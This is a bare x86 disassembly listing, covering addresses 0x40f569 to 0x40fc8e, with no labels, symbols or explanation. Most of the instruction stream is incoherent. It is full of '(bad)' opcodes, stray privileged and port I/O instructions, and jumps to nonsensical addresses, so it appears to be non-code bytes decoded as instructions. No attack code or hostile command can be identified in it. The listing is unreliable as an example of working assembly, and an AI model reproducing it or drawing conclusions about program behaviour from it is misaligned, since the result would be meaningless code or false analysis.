  40f569:	mov    eax,DWORD PTR [ebx-0xffe374]
  40f56f:	mov    eax,DWORD PTR [eax]
  40f571:	mov    eax,edi
  40f573:	nop
  40f574:	ret    
  40f575:	add    BYTE PTR [ebp-0x130077],al
  40f57b:	jne    0x40f502
  40f57d:	test   edi,edi
  40f57f:	jne    0x40f580
  40f581:	dec    DWORD PTR [ebx-0x38aa1fe8]
  40f587:	call   0xffccf24f
  40f58c:	sbb    al,0x45
  40f58e:	stos   BYTE PTR es:[edi],al
  40f58f:	mov    eax,DWORD PTR [eax]
  40f591:	mov    edx,DWORD PTR [eax+0x3]
  40f594:	inc    ebp
  40f595:	cmp    al,0x8b
  40f597:	push   cs
  40f598:	cwde   
  40f599:	inc    ebp
  40f59a:	add    BYTE PTR [ebp-0xe78b39],al
  40f5a0:	call   FWORD PTR [esp+eax*1]
  40f5a3:	test   eax,0x8bffff00
  40f5a8:	mov    DWORD PTR [esp+eiz*4],ebx
  40f5ab:	adc    BYTE PTR [ebp+0x1],0x8b
  40f5af:	add    al,ch
  40f5b1:	add    al,dh
  40f5b3:	mov    DWORD PTR [ebp-0x3d],0x7589458b
  40f5ba:	mov    ecx,DWORD PTR [ebx-0x76cfe314]
  40f5c0:	inc    ebp
  40f5c1:	add    DWORD PTR [ebx-0x7aceb000],ecx
  40f5c7:	cmp    bh,0x1
  40f5ca:	inc    DWORD PTR [eax]
  40f5cc:	inc    ebp
  40f5cd:	push   eax
  40f5ce:	xor    ebp,ecx
  40f5d0:	add    eax,DWORD PTR [edx]
  40f5d2:	mov    DWORD PTR [eax],eax
  40f5d4:	and    al,0x80
  40f5d6:	inc    DWORD PTR [ecx]
  40f5d8:	lea    eax,[eax]
  40f5da:	pushf  
  40f5db:	or     BYTE PTR [ebp-0xfe00bb],al
  40f5e1:	jmp    0x13ff86b
  40f5e6:	dec    DWORD PTR [esi]
  40f5e8:	mov    ecx,ecx
  40f5ea:	loopne 0x40f571
  40f5ec:	mov    DWORD PTR [edx],0x4d8b00c3
  40f5f2:	sbb    al,0x8b
  40f5f4:	out    dx,al
  40f5f5:	mov    eax,DWORD PTR [eax]
  40f5f7:	push   eax
  40f5f8:	push   eax
  40f5f9:	test   DWORD PTR [ebp-0x1],eax
  40f5fc:	mov    edi,edi
  40f5fe:	cwde   
  40f5ff:	inc    ebp
  40f600:	add    BYTE PTR [ebx],dh
  40f602:	mov    DWORD PTR [ebx],0x24ff8918
  40f608:	add    al,0xff
  40f60a:	add    BYTE PTR [ebx-0x5ae30f77],cl
  40f610:	(bad)  
  40f611:	(bad)  
  40f612:	(bad)  
  40f613:	(bad)  
  40f614:	push   DWORD PTR [ebx]
  40f616:	or     BYTE PTR [ebx],al
  40f618:	ror    BYTE PTR [ecx-0xbad7d0],0x83
  40f61f:	(bad)  
  40f620:	cld    
  40f621:	sbb    BYTE PTR [ebx+0x765050ff],al
  40f627:	inc    ebp
  40f628:	mov    esi,DWORD PTR [ebx]
  40f62a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f62b:	add    ecx,esi
  40f62d:	push   eax
  40f62e:	mov    BYTE PTR [ebp+0x4d],0x5
  40f632:	jmp    0x40f634
  40f634:	mov    eax,DWORD PTR [eax]
  40f636:	clc    
  40f637:	mov    ecx,DWORD PTR [esp+ebx*1]
  40f63a:	inc    DWORD PTR [eax+0x5501fc]
  40f640:	mov    BYTE PTR [ebp-0xe70075],al
  40f646:	cmp    eax,DWORD PTR [eax]
  40f648:	push   eax
  40f649:	add    cl,ch
  40f64b:	xor    BYTE PTR [esi+0x4d],cl
  40f64e:	add    edi,edi
  40f650:	mov    ecx,DWORD PTR [eax]
  40f652:	mov    al,ds:0x8b8b004d
  40f657:	mov    ebp,DWORD PTR [ebx]
  40f659:	hlt    
  40f65a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f65b:	add    dh,al
  40f65d:	add    DWORD PTR [ebp+0x45],edx
  40f660:	mov    ecx,DWORD PTR [ecx+0x18d68b28]
  40f666:	dec    ebp
  40f667:	inc    eax
  40f668:	mov    DWORD PTR [ecx-0xbadf1c],ecx
  40f66e:	add    BYTE PTR [ebx-0x38162400],cl
  40f674:	add    bl,al
  40f676:	add    BYTE PTR [ebp-0x2e003e],al
  40f67c:	mov    DWORD PTR [ebp-0x10],eax
  40f67f:	mov    DWORD PTR [ebp+0x28],esp
  40f682:	push   eax
  40f683:	dec    DWORD PTR [ecx+0x5518e88d]
  40f689:	dec    DWORD PTR [ecx+0x5545f050]
  40f68f:	xor    ecx,DWORD PTR [edi]
  40f691:	add    edx,DWORD PTR [edx]
  40f693:	push   eax
  40f694:	xchg   ebp,eax
  40f695:	inc    ebp
  40f696:	inc    DWORD PTR ds:0xe200ff
  40f69c:	jnp    0x809612a2
  40f6a2:	mov    eax,DWORD PTR [ecx]
  40f6a4:	pusha  
  40f6a5:	add    bh,bh
  40f6a7:	test   ecx,eax
  40f6a9:	dec    DWORD PTR [edi+edi*8]
  40f6ac:	ret    0x8d00
  40f6af:	add    bh,bh
  40f6b1:	mov    ch,0xd7
  40f6b3:	(bad)  
  40f6b4:	cli    
  40f6b5:	inc    DWORD PTR [ebp+0x2255f830]
  40f6bb:	test   DWORD PTR [ebp+0x74],ecx
  40f6be:	add    ecx,DWORD PTR [ebx+0x65a01889]
  40f6c4:	or     BYTE PTR [eax],al
  40f6c6:	cmp    DWORD PTR [eax+0x74],edi
  40f6c9:	add    BYTE PTR [ebx+0x114dfc23],cl
  40f6cf:	sub    eax,DWORD PTR [eax]
  40f6d1:	mov    ecx,DWORD PTR [ebp-0x77]
  40f6d4:	mov    eax,edi
  40f6d6:	add    DWORD PTR [ebx],eax
  40f6d8:	inc    ebp
  40f6d9:	dec    ebp
  40f6da:	mov    ecx,DWORD PTR [edx+0x45450118]
  40f6e0:	add    cl,BYTE PTR [ebx+0x875fc4d]
  40f6e6:	mov    ecx,DWORD PTR [ebp-0xc]
  40f6e9:	inc    eax
  40f6ea:	push   ebp
  40f6eb:	push   ecx
  40f6ec:	mov    esi,DWORD PTR [edx-0x14]
  40f6ef:	mov    edx,DWORD PTR [ecx+0xce003c]
  40f6f5:	adc    DWORD PTR [eax+eax*1],0xd68b0045
  40f6fc:	add    al,0x55
  40f6fe:	push   ebp
  40f6ff:	add    ecx,DWORD PTR [ecx-0x2d030777]
  40f705:	push   ecx
  40f706:	test   DWORD PTR [ebx],eax
  40f708:	dec    DWORD PTR [ecx+0x554518ff]
  40f70e:	mov    edi,eax
  40f710:	sbb    al,0xec
  40f712:	inc    DWORD PTR [eax]
  40f714:	mov    DWORD PTR [eax],0xff8318
  40f71a:	add    al,0x83
  40f71c:	add    al,bh
  40f71e:	mov    ebp,edx
  40f720:	push   eax
  40f721:	push   ebp
  40f722:	test   DWORD PTR [edi+edi*8-0x73],esi
  40f726:	dec    DWORD PTR [eax]
  40f728:	inc    ebp
  40f729:	push   ebp
  40f72a:	xor    ecx,DWORD PTR [ebx+0x5589f003]
  40f730:	and    al,0x8b
  40f732:	(bad)  
  40f733:	call   0x89ddaec5
  40f738:	test   DWORD PTR [eax-0x1],esp
  40f73b:	(bad)  
  40f73c:	inc    DWORD PTR [ecx+0xffff85]
  40f742:	dec    DWORD PTR [ecx-0x6a1f5f75]
  40f748:	(bad)  
  40f749:	inc    ebx
  40f74b:	dec    DWORD PTR [ebx-0x117ee316]
  40f751:	arpl   WORD PTR [eax],ax
  40f753:	int    0x50
  40f755:	xor    eax,DWORD PTR [ebp-0x7f]
  40f758:	mov    esi,DWORD PTR [eax]
  40f75a:	cwde   
  40f75b:	pushf  
  40f75c:	add    BYTE PTR [ebp-0x1],dh
  40f75f:	mov    edi,edi
  40f761:	mov    al,ds:0x4d45ce08
  40f766:	inc    DWORD PTR [ebx]
  40f768:	adc    al,0x83
  40f76a:	add    BYTE PTR [eax],0x1
  40f76d:	adc    BYTE PTR [eax],al
  40f76f:	push   ebp
  40f770:	inc    ebp
  40f771:	add    edi,edi
  40f773:	mov    edx,DWORD PTR [eax]
  40f775:	mov    ecx,DWORD PTR [ebp-0x60]
  40f778:	push   esi
  40f779:	adc    al,0x8
  40f77b:	mov    edx,DWORD PTR [ebp-0x8]
  40f77e:	mov    ecx,DWORD PTR [ebp-0x4]
  40f781:	add    DWORD PTR [ebp-0x18],0xffffff8d
  40f785:	inc    DWORD PTR [eax+esi*8]
  40f788:	inc    ebp
  40f789:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f78a:	mov    edx,DWORD PTR [ebp+0x1c]
  40f78d:	add    DWORD PTR [ebp-0x14],eax
  40f790:	mov    edx,DWORD PTR [ebp-0x70]
  40f793:	cmp    eax,DWORD PTR [eax]
  40f795:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f796:	mov    eax,DWORD PTR [eax]
  40f798:	sbb    al,0x73
  40f79a:	add    BYTE PTR [ebx],0x1
  40f79d:	hlt    
  40f79e:	add    BYTE PTR [eax+0x30],dl
  40f7a1:	mov    DWORD PTR [ecx],esi
  40f7a3:	hlt    
  40f7a4:	pop    ds
  40f7a5:	inc    ebp
  40f7a6:	xor    al,BYTE PTR [ebp+0x6c760f3a]
  40f7ac:	(bad)  
  40f7ad:	push   DWORD PTR [edi]
  40f7af:	mov    ecx,DWORD PTR [ebx+0x398503a4]
  40f7b5:	push   DWORD PTR [ebx-0x1]
  40f7b8:	mov    eax,DWORD PTR [ebp-0x740075]
  40f7be:	sub    eax,DWORD PTR [eax]
  40f7c0:	add    eax,DWORD PTR [eax]
  40f7c2:	mov    DWORD PTR [ecx+0x5f],eax
  40f7c5:	mov    DWORD PTR [ebx+0x20],ebx
  40f7c8:	ret    0xff
  40f7cb:	mov    ecx,DWORD PTR [ebx+0x1cc783dc]
  40f7d1:	ret    
  40f7d2:	mov    eax,DWORD PTR [ebp-0x6f0075]
  40f7d8:	add    BYTE PTR [ebp-0x7d],al
  40f7db:	mov    DWORD PTR [eax],eax
  40f7dd:	sub    BYTE PTR [edi+edi*8+0x18008d01],al
  40f7e4:	sar    bh,cl
  40f7e6:	test   BYTE PTR [eax+0x1],dl
  40f7e9:	inc    ebp
  40f7ea:	add    BYTE PTR [ebx],dh
  40f7ec:	test   BYTE PTR [ebx],0x84
  40f7ef:	push   eax
  40f7f0:	add    BYTE PTR [ebp+0x0],al
  40f7f3:	add    eax,0x86
  40f7f8:	add    BYTE PTR [ebx-0x7f7be340],cl
  40f7fe:	add    BYTE PTR [ecx],al
  40f800:	add    BYTE PTR [eax],al
  40f802:	mov    esi,0x550030
  40f807:	mov    ecx,DWORD PTR [edi]
  40f809:	sbb    al,0xda
  40f80b:	jne    0x40f80d
  40f80d:	mov    edi,DWORD PTR [ecx]
  40f80f:	xor    BYTE PTR [eax+eax*1],0x84
  40f813:	add    eax,DWORD PTR [eax]
  40f815:	cld    
  40f816:	add    BYTE PTR [ebp-0x4f],dh
  40f819:	mov    eax,DWORD PTR [ecx]
  40f81b:	cld    
  40f81c:	add    BYTE PTR [ecx-0x1bff009b],cl
  40f822:	retf   0xe45
  40f825:	add    eax,edx
  40f827:	sbb    al,0xb7
  40f829:	dec    ebp
  40f82a:	or     al,0x89
  40f82c:	dec    ebp
  40f82d:	sbb    al,0xf
  40f82f:	inc    ebp
  40f830:	dec    eax
  40f831:	mov    eax,DWORD PTR [ebx]
  40f833:	sbb    al,0xf
  40f835:	nop
  40f836:	scas   al,BYTE PTR es:[edi]
  40f837:	add    DWORD PTR [eax],eax
  40f839:	add    BYTE PTR [ebp-0x7674ebbb],cl
  40f83f:	mov    eax,gs
  40f841:	add    bh,bh
  40f843:	mov    edi,edi
  40f845:	cmp    DWORD PTR [edi+0x72],edx
  40f848:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  40f84e:	gs cmp al,0x0
  40f851:	je     0x40f829
  40f853:	push   eax
  40f854:	sar    BYTE PTR [eax],1
  40f856:	mov    bh,0x3e
  40f858:	push   cs
  40f859:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  40f85f:	add    DWORD PTR [ecx+0x12],ebp
  40f862:	dec    edx
  40f863:	(bad)  
  40f864:	mov    eax,edx
  40f866:	in     al,dx
  40f867:	adc    DWORD PTR [ecx],esi
  40f869:	pop    esi
  40f86a:	inc    ecx
  40f86b:	leave  
  40f86c:	or     DWORD PTR [eax],ebx
  40f86e:	gs push ebp
  40f870:	add    ah,ch
  40f872:	into   
  40f873:	in     al,dx
  40f874:	enter  0xb756,0xf0
  40f878:	push   cs
  40f879:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  40f883:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  40f889:	jnp    0x74417d91
  40f88f:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  40f895:	add    BYTE PTR [edi],cl
  40f897:	mov    edi,DWORD PTR [ecx-0x78]
  40f89a:	ltr    WORD PTR [ecx-0x7b]
  40f89e:	dec    DWORD PTR [edi]
  40f8a0:	clc    
  40f8a1:	out    0x45,eax
  40f8a3:	add    BYTE PTR [eax],cl
  40f8a5:	cmp    ebx,0xffffff8c
  40f8a8:	jge    0x40f8aa
  40f8aa:	jb     0x40f8bc
  40f8ac:	je     0x4ff92c
  40f8b2:	pop    edx
  40f8b3:	push   esi
  40f8b4:	mov    ecx,DWORD PTR [edi]
  40f8b6:	in     al,dx
  40f8b7:	rol    DWORD PTR [ebp+0x0],1
  40f8ba:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  40f8c1:	cmp    DWORD PTR [ecx],0xfffffff0
  40f8c4:	hlt    
  40f8c5:	mov    esp,DWORD PTR [eax+0xf034d2b]
  40f8cb:	(bad)  
  40f8cd:	push   eax
  40f8ce:	jns    0xb840dd4c
  40f8d4:	lock push cs
  40f8d6:	ror    edx,0x3
  40f8d9:	test   BYTE PTR [ecx+0x5500e800],cl
  40f8df:	dec    eax
  40f8e0:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  40f8e4:	(bad)  
  40f8e5:	mov    esi,0x7f33ff5f
  40f8ea:	inc    eax
  40f8eb:	test   DWORD PTR [edx],eax
  40f8ed:	je     0x40f8af
  40f8ef:	mov    ecx,ecx
  40f8f1:	adc    DWORD PTR [ebp-0xc],0xffffffec
  40f8f5:	and    eax,DWORD PTR [eax+0xf0103]
  40f8fb:	jp     0x40f8e9
  40f8fd:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  40f901:	add    edx,DWORD PTR [edi+0x74]
  40f904:	sbb    BYTE PTR [ebp+0x4d001484],cl
  40f90a:	add    BYTE PTR [ebp-0x74c48bbb],al
  40f910:	je     0x40f895
  40f912:	cmp    eax,edi
  40f914:	js     0x40f939
  40f916:	add    eax,0xeb0fc003
  40f91b:	jns    0x40f8a8
  40f91d:	vmread DWORD PTR [ecx+0x45],ebx
  40f921:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  40f927:	adc    al,0x8b
  40f929:	jge    0x40f93f
  40f92b:	mov    edi,DWORD PTR [eax-0x4]
  40f92e:	add    edi,DWORD PTR [edi]
  40f930:	or     bh,bh
  40f932:	push   ebp
  40f933:	push   es
  40f934:	mov    DWORD PTR [ebp-0x4],ebx
  40f937:	add    edi,esi
  40f939:	pop    es
  40f93a:	add    esi,DWORD PTR [edi-0x48ccf183]
  40f940:	mov    DWORD PTR [esp+esi*8],ecx
  40f943:	inc    ebp
  40f944:	pop    ebp
  40f945:	xor    DWORD PTR [esi-0x4],0x3b
  40f949:	add    edx,DWORD PTR [ecx+edi*1]
  40f94c:	push   es
  40f94d:	clc    
  40f94e:	mov    bh,0xdb
  40f950:	jp     0x40f909
  40f952:	add    cl,BYTE PTR [esi]
  40f954:	div    DWORD PTR [edi+0x4d8b0c1c]
  40f95a:	test   edi,edi
  40f95c:	je     0x40f952
  40f95e:	mov    eax,ecx
  40f960:	or     BYTE PTR [ebx],al
  40f962:	dec    BYTE PTR [ecx+0x7d3bec7d]
  40f968:	jbe    0x40f9dc
  40f96a:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  40f970:	add    ecx,DWORD PTR [esi]
  40f972:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  40f978:	add    eax,DWORD PTR [ebx-0x287af783]
  40f97e:	je     0x40f9cd
  40f980:	mov    DWORD PTR [ecx],edi
  40f982:	mov    esi,eax
  40f984:	hlt    
  40f985:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  40f98c:	jb     0x40f94e
  40f98e:	jmp    0x40f97b
  40f990:	xor    esi,DWORD PTR [ebx]
  40f992:	pop    edi
  40f993:	pop    esi
  40f994:	pop    ebx
  40f995:	ret    
  40f996:	ret    0x8b
  40f999:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  40f99f:	xor    DWORD PTR ds:0x89339c0c,0x56
  40f9a6:	cld    
  40f9a7:	cmp    DWORD PTR [ebp+0xf],eax
  40f9aa:	xor    al,BYTE PTR [ebp-0x7474ff64]
  40f9b0:	cld    
  40f9b1:	or     al,0x4d
  40f9b3:	ret    
  40f9b4:	mov    edi,DWORD PTR [esi-0x4]
  40f9b7:	pop    eax
  40f9b8:	dec    ebp
  40f9b9:	jne    0x40f946
  40f9bb:	xor    edi,esp
  40f9bd:	inc    eax
  40f9be:	dec    ebp
  40f9bf:	jbe    0x40fa14
  40f9c1:	inc    eax
  40f9c2:	pop    ebp
  40f9c3:	add    edx,DWORD PTR [esi+0x8]
  40f9c6:	push   esi
  40f9c7:	dec    eax
  40f9c8:	push   ecx
  40f9c9:	mov    eax,edi
  40f9cb:	and    al,0xf0
  40f9cd:	jo     0x40f9ba
  40f9cf:	mov    eax,DWORD PTR [ebx]
  40f9d1:	sbb    BYTE PTR [ebp+0x4d],cl
  40f9d4:	mov    eax,DWORD PTR [ebx]
  40f9d6:	nop
  40f9d7:	or     BYTE PTR [eax],al
  40f9d9:	jne    0x40fa32
  40f9db:	cmp    ebx,DWORD PTR [ebp+0x33893277]
  40f9e1:	cld    
  40f9e2:	xor    edi,edi
  40f9e4:	add    edi,DWORD PTR [ebp+0x3]
  40f9e7:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  40f9ed:	js     0x40f973
  40f9ef:	jae    0x40f9f3
  40f9f1:	(bad)  
  40f9f3:	xor    al,0x5d
  40f9f5:	jmp    0x40f982
  40f9f7:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  40f9fe:	fdecstp 
  40fa00:	test   BYTE PTR [edi],ah
  40fa02:	add    bh,BYTE PTR [ebp+0x0]
  40fa05:	add    ebx,DWORD PTR [ebp-0x77]
  40fa08:	mov    edi,eax
  40fa0a:	cmp    al,0x0
  40fa0d:	adc    dh,BYTE PTR [ebx]
  40fa0f:	jge    0x40fa14
  40fa11:	mov    edi,DWORD PTR [ebx]
  40fa13:	jl     0x40fa24
  40fa15:	clc    
  40fa16:	dec    edi
  40fa17:	jge    0x40fa19
  40fa19:	mov    eax,DWORD PTR [ebx]
  40fa1b:	jb     0x40fa25
  40fa1d:	mov    ecx,DWORD PTR [ebp-0x8]
  40fa20:	mov    edi,edi
  40fa22:	xor    edx,DWORD PTR [eax]
  40fa24:	add    edi,DWORD PTR [ebx]
  40fa26:	mov    DWORD PTR [ebp-0x10],edi
  40fa29:	inc    edi
  40fa2a:	pop    ebp
  40fa2b:	jge    0x40fa68
  40fa2d:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  40fa31:	mov    edx,0xc05d87f0
  40fa36:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  40fa3a:	fimul  WORD PTR [eax]
  40fa3c:	fist   WORD PTR [ebp+0x1c]
  40fa3f:	in     al,dx
  40fa40:	jne    0x40fa2e
  40fa42:	mov    edi,DWORD PTR [edx-0x7a27a10]
  40fa48:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  40fa4c:	fdivp  st(0),st
  40fa4e:	fild   WORD PTR [ebp+0x4510f85c]
  40fa54:	test   BYTE PTR [ebx+0x4d00fc02],cl
  40fa5a:	inc    ebp
  40fa5b:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  40fa61:	mov    ebp,DWORD PTR [ebx-0x4]
  40fa64:	adc    al,0x8b
  40fa66:	rcl    DWORD PTR [eax],0x48
  40fa69:	mov    esi,0x7080803
  40fa6e:	fiadd  WORD PTR [ebp+0x4d]
  40fa71:	(bad)  
  40fa72:	mov    edx,DWORD PTR [edx-0x4]
  40fa75:	mov    edx,DWORD PTR [ebp-0x4]
  40fa78:	xor    ebx,DWORD PTR [ebx+0x330103]
  40fa7e:	mov    DWORD PTR [edi+0x872dc],edi
  40fa84:	xlat   BYTE PTR ds:[ebx]
  40fa85:	into   
  40fa86:	ffreep st(6)
  40fa88:	retf   0x6c7
  40fa8b:	iret   
  40fa8c:	dec    ebp
  40fa8d:	inc    ebp
  40fa8e:	mov    DWORD PTR [ebx],edi
  40fa90:	fmul   QWORD PTR [edi]
  40fa92:	dec    ebp
  40fa93:	jnp    0x40fac8
  40fa95:	add    BYTE PTR [ebx],al
  40fa97:	mov    ecx,DWORD PTR [esp+edi*8]
  40fa9a:	inc    ebp
  40fa9b:	dec    ebp
  40fa9c:	lea    esi,[ebx]
  40fa9e:	add    DWORD PTR [ebx],eax
  40faa0:	jb     0x40fadd
  40faa2:	add    BYTE PTR [edi],cl
  40faa4:	inc    ebp
  40faa5:	imul   eax,edi,0x858bd800
  40faab:	cld    
  40faac:	clc    
  40faad:	mov    DWORD PTR [ebp+0x0],eax
  40fab0:	inc    DWORD PTR [eax]
  40fab2:	or     al,0xde
  40fab4:	sbb    bh,0x1
  40fab7:	retf   
  40fab8:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  40fabf:	dec    ebp
  40fac0:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  40fac6:	enter  0x12de,0xdf
  40faca:	inc    ebp
  40facb:	pop    ebp
  40facc:	dec    DWORD PTR [ebx-0x257f0ff4]
  40fad2:	add    DWORD PTR [edx],edx
  40fad4:	add    BYTE PTR [ebp+0x50],dl
  40fad7:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  40fadd:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  40fae3:	or     ah,al
  40fae5:	pop    ss
  40fae6:	cdq    
  40fae7:	push   ebp
  40fae8:	clc    
  40fae9:	mov    eax,DWORD PTR [ebp-0x4]
  40faec:	xor    edx,edx
  40faee:	add    esi,DWORD PTR [ebx]
  40faf0:	cmp    eax,DWORD PTR [ebx]
  40faf2:	hlt    
  40faf3:	cmp    DWORD PTR [ebx],esp
  40faf5:	or     al,BYTE PTR [ebp+0xf]
  40faf8:	mov    eax,DWORD PTR [edx]
  40fafa:	loopne 0x40fafc
  40fafc:	(bad)  
  40fafd:	mov    ecx,esi
  40faff:	cld    
  40fb00:	pushf  
  40fb01:	pop    ebp
  40fb02:	popf   
  40fb03:	mov    esi,DWORD PTR [edx]
  40fb05:	lock mov eax,eax
  40fb08:	adc    BYTE PTR [ebx],al
  40fb0a:	or     BYTE PTR [ebx+0x4d001001],0xcf
  40fb11:	xor    ebp,DWORD PTR [edi+0x50e45189]
  40fb17:	dec    ebp
  40fb18:	mov    ecx,DWORD PTR [ebx-0x31390304]
  40fb1e:	(bad)  
  40fb1f:	iret   
  40fb20:	inc    ebp
  40fb21:	(bad)  
  40fb22:	jne    0x40fb71
  40fb24:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  40fb2a:	(bad)  
  40fb2b:	cmp    ebx,eax
  40fb2d:	je     0x40fab5
  40fb2f:	add    edi,edi
  40fb31:	or     bh,bh
  40fb33:	dec    ebp
  40fb34:	inc    ebp
  40fb35:	mov    esi,DWORD PTR [ebx]
  40fb37:	cld    
  40fb38:	add    ecx,esi
  40fb3a:	cmp    ecx,DWORD PTR [eax-0xc]
  40fb3d:	mov    edx,DWORD PTR [edi]
  40fb3f:	or     BYTE PTR [ebp-0x7c],al
  40fb42:	mov    ebx,DWORD PTR [ebp-0x7639cd18]
  40fb48:	test   BYTE PTR [ebx*4-0x76c1cdbb],cl
  40fb4f:	pushf  
  40fb50:	call   0x51eae0
  40fb55:	jne    0x40fb1e
  40fb57:	mov    ebp,esp
  40fb59:	fcomp  DWORD PTR [ebx]
  40fb5b:	add    BYTE PTR [ecx],al
  40fb5d:	inc    DWORD PTR [ebp-0x75]
  40fb60:	(bad)  
  40fb61:	cld    
  40fb62:	add    al,0xce
  40fb64:	mov    ecx,edi
  40fb66:	cld    
  40fb67:	inc    ebp
  40fb68:	fidivr WORD PTR [ebx]
  40fb6a:	fbstp  TBYTE PTR [ebp-0x3e]
  40fb6d:	mov    eax,DWORD PTR [eax]
  40fb6f:	adc    BYTE PTR [ebx-0x3974038b],cl
  40fb75:	fadd   st,st(7)
  40fb77:	add    BYTE PTR [ebp-0x1],al
  40fb7a:	mov    ecx,DWORD PTR [esp+edi*8]
  40fb7d:	inc    ebp
  40fb7e:	mov    bh,0xc7
  40fb81:	loopne 0x40fbc8
  40fb83:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  40fb89:	sbb    dh,BYTE PTR [ebx]
  40fb8b:	pushf  
  40fb8c:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  40fb92:	mov    eax,edi
  40fb94:	cwde   
  40fb95:	inc    ebp
  40fb96:	inc    ebp
  40fb97:	jne    0x40fb24
  40fb99:	mov    esp,esp
  40fb9b:	clc    
  40fb9c:	add    al,0x4d
  40fb9e:	mov    DWORD PTR [ebx],esi
  40fba0:	or     al,0x33
  40fba2:	inc    ebp
  40fba3:	lea    ecx,[ebx-0x398d13fd]
  40fba9:	add    bh,al
  40fbab:	inc    ebp
  40fbac:	ror    DWORD PTR [ebx+0x45d829],0x8b
  40fbb3:	add    ebp,esp
  40fbb5:	shufps xmm1,xmm3,0xc7
  40fbb9:	(bad)  
  40fbba:	jmp    0x748636e3
  40fbbf:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  40fbc5:	hlt    
  40fbc6:	mov    ecx,DWORD PTR [edi]
  40fbc8:	fadd   DWORD PTR [ebp+0x0]
  40fbcb:	xor    ecx,DWORD PTR [edi]
  40fbcd:	add    ecx,ecx
  40fbcf:	cmp    edi,edi
  40fbd1:	pmuludq mm7,QWORD PTR [edx+0x50]
  40fbd5:	(bad)  
  40fbd6:	jmp    0x40fb63
  40fbd8:	mov    edi,esp
  40fbda:	or     al,0xc6
  40fbdc:	inc    ebp
  40fbdd:	(bad)  
  40fbde:	mov    eax,DWORD PTR [ebp+0x10]
  40fbe1:	jne    0x40fb6c
  40fbe3:	mov    eax,DWORD PTR [ecx]
  40fbe5:	clc    
  40fbe6:	add    BYTE PTR [ebp-0x40],cl
  40fbe9:	xor    edx,DWORD PTR [eax-0x73]
  40fbec:	jne    0x40fbef
  40fbee:	push   DWORD PTR [edx+0x8]
  40fbf1:	add    BYTE PTR [ebp+0x45],al
  40fbf4:	mov    ebp,ecx
  40fbf6:	cld    
  40fbf7:	add    BYTE PTR [ebp+0x0],cl
  40fbfa:	xor    eax,DWORD PTR [ebp+0x3]
  40fbfd:	lea    edi,[ebx]
  40fbff:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  40fc05:	sub    eax,0x5d330e4d
  40fc0a:	lea    esi,[ebx]
  40fc0c:	add    DWORD PTR [ebx],eax
  40fc0e:	jb     0x40fbf9
  40fc10:	add    BYTE PTR [eax],al
  40fc12:	inc    ebp
  40fc13:	add    bl,ch
  40fc15:	inc    ebp
  40fc16:	mov    esi,DWORD PTR [ebx]
  40fc18:	or     al,0x3
  40fc1a:	(bad)  
  40fc1b:	mov    edi,eax
  40fc1d:	in     al,dx
  40fc1e:	scas   eax,DWORD PTR es:[edi]
  40fc1f:	inc    ebp
  40fc20:	mov    esi,DWORD PTR [ebx]
  40fc22:	in     al,0x3
  40fc24:	add    al,0x89
  40fc26:	mov    ecx,DWORD PTR [eax+edi*8]
  40fc29:	dec    ebp
  40fc2a:	(bad)  
  40fc2b:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3163]
  40fc32:	mov    ecx,eax
  40fc34:	cld    
  40fc35:	push   es
  40fc36:	dec    ebp
  40fc37:	add    al,0x33
  40fc39:	mov    DWORD PTR [ebx],eax
  40fc3b:	in     al,dx
  40fc3c:	cmp    DWORD PTR [ebp-0x67],eax
  40fc3f:	mov    eax,DWORD PTR [ebp-0xba0068]
  40fc45:	mov    edx,DWORD PTR [ebp-0x4]
  40fc48:	mov    ecx,DWORD PTR [ebp-0x18]
  40fc4b:	xor    ecx,DWORD PTR [ebp+0x3]
  40fc4e:	cmp    DWORD PTR [ebx],0x8b32749c
  40fc54:	xor    edi,esp
  40fc56:	jmp    0xff74f9a8
  40fc5b:	add    ecx,DWORD PTR [ebp-0x3f]
  40fc5e:	xor    ebx,DWORD PTR [edi]
  40fc60:	add    eax,ecx
  40fc62:	cmp    ebx,DWORD PTR [eax]
  40fc64:	mov    ecx,DWORD PTR [ebp-0x4]
  40fc67:	mov    ecx,DWORD PTR [eax]
  40fc69:	adc    BYTE PTR [ebp-0x80],al
  40fc6c:	jmp    0x40fc6f
  40fc6e:	mov    eax,DWORD PTR [eax]
  40fc70:	cld    
  40fc71:	mov    bh,0xc6
  40fc73:	push   ecx
  40fc74:	(bad)  
  40fc75:	jne    0x40fcd5
  40fc77:	dec    ecx
  40fc79:	or     BYTE PTR [ecx+ebx*1],cl
  40fc7c:	push   ebp
  40fc7d:	inc    ebp
  40fc7e:	in     al,dx
  40fc7f:	add    ebp,esp
  40fc81:	or     bh,al
  40fc83:	dec    ebp
  40fc84:	cld    
  40fc85:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  40fc8b:	xor    DWORD PTR [edx],0x2
  40fc8e:	pushf  
